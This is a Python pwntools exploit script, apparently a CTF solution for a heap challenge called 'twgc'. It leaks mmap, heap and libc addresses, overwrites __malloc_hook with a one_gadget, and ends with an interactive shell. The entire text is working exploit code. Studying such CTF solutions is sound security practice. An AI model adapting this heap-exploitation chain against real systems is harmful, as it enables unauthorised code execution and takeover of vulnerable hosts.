#!/usr/bin/env python
from pwn import *

def create(name, data):
    s.sendlineafter('>>  ', '1')
    s.sendlineafter('name: ', name)
    s.sendlineafter('string : ', data)

def edit(source, destination, data):
    s.sendlineafter('>>  ', '2')
    s.sendlineafter('root): ', source)
    s.sendlineafter('destination: ', destination)
    s.sendlineafter('string : ', data)

def add(source, destination):
    s.sendlineafter('>>  ', '3')
    s.sendlineafter('source: ', source)
    s.sendlineafter('destination: ', destination)

def remove(source, destination):
    s.sendlineafter('>>  ', '4')
    s.sendlineafter('root): ', source)
    s.sendlineafter('destination: ', destination)

def show(source, destination):
    s.sendlineafter('>>  ', '5')
    s.sendlineafter('root): ', source)
    s.sendlineafter('destination: ', destination)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./twgc', env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('twgc.chal.ctf.westerns.tokyo', 11419)

    libc = ELF('./libc.so.6')

    for i in range(8, 0x18):
        c = chr(ord('A') + i)
        create(c, c * 0x1cf)
        if i < 0x10:
            remove('root', c)
    for j in range(0x10):
        for i in range(0x10):
            c = chr(ord('A') + i)
            create(c, c * 0x1cf)
            remove('root', c)
    for i in range(0x10):
        c = chr(ord('A') + i)
        create(c, c * 0x1cf)
        add('Q', c)
        remove('root', c)
    create('1', '1' * 0x1e7)
    create('2', '2' * 0x1b7)

    for i in range(0xe):
        create('3', '3' * 0x1cf)
        remove('root', '3')
    create('3', '3' * 0x1cf)
    remove('root', '3')
    show('Q', '\xb8\x01')
    mmap_base = u64(s.recvline(False).ljust(8, '\0')) - 0x218
    log.info('mmap base: %#x' % mmap_base)

    create('x', 'x' * 0x1cf)
    create('3', '3' * 0x1df)
    remove('root', '3')
    create('3', '3' * 0x1bf)
    remove('root', '3')
    show('Q', '')
    heap_addr = u64(s.recvline(False).ljust(8, '\0'))
    log.info('heap address: %#x' % heap_addr)
    remove('Q', '')

    create('y', 'y' * 0x1cf)
    create('z', 'z' * 0x1cf)
    create('3', '3' * 0x1cf)
    remove('root', '3')
    create('w', 'w' * 0x1cf)

    edit('root', '1', p64(2) + p64(heap_addr - 0x30) + p64(mmap_base + 0x3e9))
    for i in range(0x8):
        create('3', '3' * 0x1cf)
        remove('root', '3')

    create('3', '3' * 0x1ef)
    create('4', '4' * 0x1af)
    edit('Q', '', p64(0) * 2 + p64(mmap_base + 0x30) + '4')
    create('5', '5' * 0x1cf)
    show('4', '\x11\x02')
    libc_base = u64(s.recvline(False).ljust(8, '\0')) - 0x3c4b78
    log.info('libc base: %#x' % libc_base)
    show('4', '\x01')
    mmap_base2 = (u64(s.recvline(False).ljust(8, '\0')) << 8) - 0x400
    log.info('mmap base 2: %#x' % mmap_base2)

    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    edit('Q', '', p64(0) * 2 + p64(mmap_base2 + 0x30) + '4')
    edit('root', 'Q', p64(1) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x30))
    edit('4', '', p64(libc_base + one_gadgets[1]))
    create('6', '6')

    s.interactive()
